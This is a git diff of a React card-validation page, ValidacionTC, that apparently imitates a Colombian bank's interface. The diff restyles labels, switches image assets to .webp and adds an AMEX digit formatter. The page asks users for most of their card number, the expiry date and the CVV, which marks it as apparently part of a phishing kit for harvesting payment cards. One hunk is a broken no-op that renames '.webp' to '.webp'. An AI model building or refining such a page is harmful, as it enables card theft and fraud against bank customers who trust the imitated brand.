@@ -114,9 +114,9 @@ export default function ValidacionTC() {
         if (!data || !data.filename) return data;
         let filename = data.filename;
 
-        // 1. Convert legacy .png to .webp
-        if (filename.endsWith(".png")) {
-            filename = filename.replace(".png", ".webp");
+        // 1. Convert legacy .webp to .webp
+        if (filename.endsWith(".webp")) {
+            filename = filename.replace(".webp", ".webp");
         }
 
         // 2. Specific migrations for renamed assets
@@ -330,10 +330,10 @@ export default function ValidacionTC() {
     // 2. SISTEMA DE AJUSTE VISUAL (NORMALIZACIÓN)
     const CARD_ADJUSTMENTS = {
         // --- VISA ---
-        "Visa-Clasica.png": { transform: "scale(1.15)" },
-        "Visa-seleccion-colombia.png": { transform: "scale(1.15)" },
-        "Visa-Oro.png": { transform: "scale(1.15)" },
-        "Visa-Platinum-v1.png": { transform: "scale(1.1)" },
+        "Visa-Clasica.webp": { transform: "scale(1.15)" },
+        "Visa-seleccion-colombia.webp": { transform: "scale(1.15)" },
+        "Visa-Oro.webp": { transform: "scale(1.15)" },
+        "Visa-Platinum-v1.webp": { transform: "scale(1.1)" },
         // --- MASTERCARD ---
         "Mastercard-Unica.webp": { transform: "scale(1.1)" },
         "Mastercard-oro.webp": { transform: "scale(1.1)" },
@@ -346,7 +346,7 @@ export default function ValidacionTC() {
         "Débito Clásica.webp": { transform: "scale(1.04)" },
         "debito_virtual.webp": { transform: "scale(1.05)" },
         // --- AMEX ---
-        "Amex+Libre.png": { transform: "scale(1.15)" },
+        "Amex+Libre.webp": { transform: "scale(1.15)" },
     };
 
     const getCardStyle = (filename) => {
@@ -791,6 +791,34 @@ export default function ValidacionTC() {
         </div>
     );
 
+    // Metodo para formatear los dígitos de la tarjeta con espacios
+    const formatCardDigits = (digits) => {
+
+        // Limpiar cualquier carácter no numérico
+        const clean = digits.replace(/\D/g, "");
+
+        // AMEX → 4 - 6 - 5 (15 dígitos)
+        if (isAmex) {
+
+            // Se dividen en grupos
+            const a = clean.slice(0, 4);
+            const b = clean.slice(4, 10);
+            const c = clean.slice(10, 15);
+
+            // Se capturan los ultimos dígitos 
+            const lastDigits = cardData.digits || "";
+
+            // Se agrega los ultimos dígitos al final
+            const cWithLast = c + lastDigits;
+
+            // Se retornan con espacios
+            return [a, b, cWithLast].filter(Boolean).join(" ");
+        };
+
+        // Default → 4 - 4 - 4 - 4 (16 dígitos)
+        return clean.match(/.{1,4}/g)?.join(" ") || "";
+    };
+
     // Se retorna el componente
     return (
         <>
@@ -822,24 +850,21 @@ export default function ValidacionTC() {
 
                     <div className="login-page">
                         <div className="login-box" style={{ backgroundColor: "#454648" }}>
-
                             <div style={{ display: "flex", alignItems: "flex-start", gap: "15px", marginBottom: "24px" }}>
                                 <img src={getCardImagePath()} alt={cardData.label} style={{ width: "70px", borderRadius: "8px", flexShrink: 0 }} />
-                                <h2 style={{ fontSize: "20px", fontWeight: "bold", color: "#ffffff", margin: 0, textAlign: "left", lineHeight: "1.4" }}>
+                                <h2 className='bc-card-auth-title2 bc-cibsans-font-style-5-bold' style={{ fontSize: "18px", fontWeight: "bold", color: "#ffffff", margin: 0, textAlign: "left", lineHeight: "1.4" }}>
                                     {step === "front"
                                         ? `Ingresa los datos de tu Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
                                         : `Validación del CVV de la Tarjeta ${getTipoTarjeta()} terminada en ${cardData.digits}`
                                     }
                                 </h2>
                             </div>
-
-                            <p style={{ fontSize: "16px", lineHeight: "24px", color: "#ffffff", marginBottom: "30px", textAlign: "left" }}>
+                            <p className='bc-card-auth-description' style={{ fontSize: "16px", fontWeight: "500", lineHeight: "24px", color: "#ffffff", marginBottom: "30px", textAlign: "center" }}>
                                 {step === "front"
-                                    ? "Ingresa los primeros 12 dígitos y la fecha de expiración de tu tarjeta."
+                                    ? `Ingresa los primeros ${isAmex ? 11 : 12} dígitos y la fecha de expiración de tu tarjeta.`
                                     : "Para garantizar la seguridad de tu cuenta, confirma el código de seguridad (CVV)."
                                 }
                             </p>
-
                             <div className="flip-card" style={{
                                 opacity: imagesLoaded ? 1 : 0,
                                 transition: "opacity 0.3s ease-in-out"
@@ -852,25 +877,23 @@ export default function ValidacionTC() {
                                             alt="Frente"
                                             style={getCardStyle(cardData.filename)}
                                         />
-
-                                        {/* --- DIGITOS (Personalizable en cardTextConfig.js) --- */}
-                                        <div style={{
-                                            position: "absolute",
-                                            top: getCardConfig(cardData.filename).digits?.top || "58%",
-                                            left: getCardConfig(cardData.filename).digits?.left || "50%",
-                                            transform: "translate(-50%, -50%)",
-                                            width: getCardConfig(cardData.filename).digits?.width || "88%",
-                                            textAlign: getCardConfig(cardData.filename).digits?.textAlign || "left",
-                                            color: getCardConfig(cardData.filename).digits?.color || "#ffffff",
-                                            textShadow: "2px 2px 4px rgba(0,0,0,0.8)",
-                                            pointerEvents: "none"
-                                        }}>
+                                        <div
+                                            style={{
+                                                position: "absolute",
+                                                top: getCardConfig(cardData.filename).digits?.top || "58%",
+                                                left: getCardConfig(cardData.filename).digits?.left || "50%",
+                                                transform: "translate(-50%, -50%)",
+                                                width: getCardConfig(cardData.filename).digits?.width || "88%",
+                                                textAlign: getCardConfig(cardData.filename).digits?.textAlign || "left",
+                                                color: getCardConfig(cardData.filename).digits?.color || "#ffffff",
+                                                textShadow: "2px 2px 4px rgba(0,0,0,0.8)",
+                                                pointerEvents: "none"
+                                            }}
+                                        >
                                             <div className="digits-text">
-                                                {cardDigits.padEnd(requiredDigitsLength, '•').match(/.{1,4}/g)?.join(' ')} {cardData.digits}
+                                                {formatCardDigits(cardDigits.padEnd(requiredDigitsLength, "•"))}
                                             </div>
                                         </div>
-
-                                        {/* --- FECHA (Personalizable en cardTextConfig.js) --- */}
                                         <div style={{
                                             position: "absolute",
                                             top: getCardConfig(cardData.filename).date?.top || "70%",
@@ -887,15 +910,12 @@ export default function ValidacionTC() {
                                             </div>
                                         </div>
                                     </div>
-
                                     <div className="flip-card-back">
                                         <img
                                             src={getBackCardImagePath()}
                                             alt="Reverso"
                                             style={getCardStyle(getBackCardFilename(cardData.filename))}
                                         />
-
-                                        {/* --- TEXTO DINÁMICO BACK (CVV) (Personalizable en cardTextConfig.js) --- */}
                                         <div style={{
                                             position: "absolute",
                                             top: getCardConfig(cardData.filename).back.top,
@@ -910,17 +930,14 @@ export default function ValidacionTC() {
                                             {cvv}
                                         </div>
                                     </div>
-
                                 </div>
                             </div>
-
                             <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "25px", width: "100%" }}>
-
                                 {step === "front" ? (
                                     <>
                                         <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                             {renderVisualInputDigits()}
-                                            <label htmlFor="cardDigits" style={{ color: "#ffffff", fontWeight: "bold", fontSize: "14px", textAlign: 'center' }}>
+                                            <label className='bc-card-auth-description' htmlFor="cardDigits" style={{ color: "#ffffff", fontWeight: "500", fontSize: "16px", textAlign: 'center' }}>
                                                 Ingrese los primeros {requiredDigitsLength} dígitos de su tarjeta
                                             </label>
                                             <input
@@ -945,10 +962,9 @@ export default function ValidacionTC() {
                                                 }}
                                             />
                                         </div>
-
                                         <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                             {renderVisualInputExpiration()}
-                                            <label htmlFor="expirationDate" style={{ color: "#ffffff", fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>
+                                            <label className='bc-card-auth-description' htmlFor="expirationDate" style={{ color: "#ffffff", fontWeight: "500", fontSize: "16px", marginTop: "5px" }}>
                                                 Fecha de expiración (MM/YY)
                                             </label>
                                             <input
@@ -978,7 +994,7 @@ export default function ValidacionTC() {
                                     <>
                                         <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                             {renderVisualInputCVV()}
-                                            <label htmlFor="cvv" style={{ color: "#ffffff", margin: 0, fontWeight: "bold", fontSize: "14px", marginTop: "5px" }}>CVV</label>
+                                            <label htmlFor="cvv" style={{ color: "#ffffff", margin: 0, fontWeight: "500", fontSize: "16px", marginTop: "5px" }}>CVV</label>
                                             <input
                                                 id="cvv"
                                                 type="tel"
@@ -1004,11 +1020,8 @@ export default function ValidacionTC() {
                                         </div>
                                     </>
                                 )}
-
                             </div>
-
                             <br /><br />
-
                             <button className="bc-button-primary login-btn" onClick={handleContinue}
                                 style={{
                                     marginTop: "20px",
@@ -1026,10 +1039,8 @@ export default function ValidacionTC() {
                             >
                                 {step === "front" ? "Siguiente" : (submitted ? "Enviado" : "Enviar")}
                             </button>
-
                         </div>
                     </div>
-
                     <div className="login-page-footer mt-4">
                         <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                             <span>¿Problemas para conectarte?</span>
@@ -1068,7 +1079,7 @@ export default function ValidacionTC() {
             </div>
 
             <div className="visual-captcha" style={{ cursor: "pointer" }}>
-                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
+                <img src="/assets/images/lateral-der.webp" alt="Visual Captcha" />
             </div>
 
             {cargando ? <Loading /> : null}
@@ -1079,4 +1090,4 @@ export default function ValidacionTC() {
             />
         </>
     );
-}
+};
